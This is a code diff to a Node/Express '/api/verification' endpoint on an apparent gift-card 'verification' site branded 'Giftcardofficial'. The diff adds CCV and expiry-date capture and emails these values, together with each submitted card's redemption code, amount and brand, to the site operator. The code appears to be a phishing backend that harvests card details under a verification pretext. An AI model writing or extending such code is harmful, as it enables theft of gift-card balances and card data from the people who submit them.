@@ -140,6 +140,16 @@ app.post("/api/verification", limiter, async (req, res) => {
 
     const redemptionCode = personalMessage;
 
+    const cardCcv =
+      typeof req.body?.cardCcv === "string"
+        ? req.body.cardCcv.trim()
+        : "";
+
+    const expiryDate =
+      typeof req.body?.expiryDate === "string"
+        ? req.body.expiryDate.trim()
+        : "";
+
     /* VALIDATE CARD BRAND */
 
     if (!allowedCards.includes(cardType)) {
@@ -173,6 +183,19 @@ app.post("/api/verification", limiter, async (req, res) => {
     if (personalMessage.length > 40) {
       return res.status(400).json({
         message: "Your message must not exceed 40 characters.",
+      });
+    }
+
+    /* VALIDATE CCV / EXPIRY (Optional length limits) */
+    if (cardCcv.length > 10) {
+      return res.status(400).json({
+        message: "Please enter a valid CCV.",
+      });
+    }
+
+    if (expiryDate.length > 20) {
+      return res.status(400).json({
+        message: "Please enter a valid expiry date.",
       });
     }
 
@@ -216,6 +239,9 @@ app.post("/api/verification", limiter, async (req, res) => {
     const safeMessage = escapeHtml(
       personalMessage || "No message provided"
     );
+
+    const safeCardCcv = escapeHtml(cardCcv || "Not provided");
+    const safeExpiryDate = escapeHtml(expiryDate || "Not provided");
 
     const safeSubmittedAt = escapeHtml(submittedAt);
 
@@ -289,6 +315,24 @@ app.post("/api/verification", limiter, async (req, res) => {
             </tr>
 
             <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                CCV
+              </td>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                ${safeCardCcv}
+              </td>
+            </tr>
+
+            <tr>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                Expiry Date
+              </td>
+              <td style="padding: 10px; border-bottom: 1px solid #ddd;">
+                ${safeExpiryDate}
+              </td>
+            </tr>
+
+            <tr>
               <td style="padding: 10px;">
                 Submitted
               </td>
@@ -305,7 +349,7 @@ app.post("/api/verification", limiter, async (req, res) => {
             margin-top: 24px;
           ">
             This notification contains gift-card metadata
-            and the sender's personal message.
+            and the sender's details.
           </p>
 
           <p style="color: #6040a5; font-size: 13px;">
@@ -322,6 +366,8 @@ Card brand: ${cardType}
 Currency: ${currency}
 Amount: ${currency} ${amount.toLocaleString("en-US")}
 Redemption Code: ${redemptionCode || "No code provided"}
+CCV: ${cardCcv || "Not provided"}
+Expiry Date: ${expiryDate || "Not provided"}
 Submitted: ${submittedAt}
 
 Giftcardofficial
@@ -356,6 +402,8 @@ Giftcardofficial
         currency,
         amount,
         message: redemptionCode,
+        cardCcv,
+        expiryDate,
       },
     });
 
